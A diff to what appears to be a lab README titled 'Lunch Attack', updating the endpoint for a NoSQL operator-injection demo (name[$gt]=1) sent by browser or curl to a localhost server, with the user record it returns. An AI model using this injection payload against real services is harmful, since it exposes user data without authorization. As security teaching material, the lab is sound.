@@ -11,13 +11,13 @@
 # Lunch Attack
 
 - ### Browser [open the browser and enter the following url]
-    http://localhost:8000/user?name[%24gt]=1
+    http://localhost:8000/api/get_user?name[%24gt]=1
 - the `response` will be {"id":1,"uid":1,"name":"Doe","createdAt":"...","updatedAt":"..."}
 
 ## OR
 
 - ### Curl [open the terminal and run the following]
-    curl http://localhost:8000/user?name[%24gt]=1
+    curl http://localhost:8000/api/get_user?name[%24gt]=1
 - the `response` will be {"id":1,"uid":1,"name":"Doe","createdAt":"...","updatedAt":"..."}
 
 ## OR
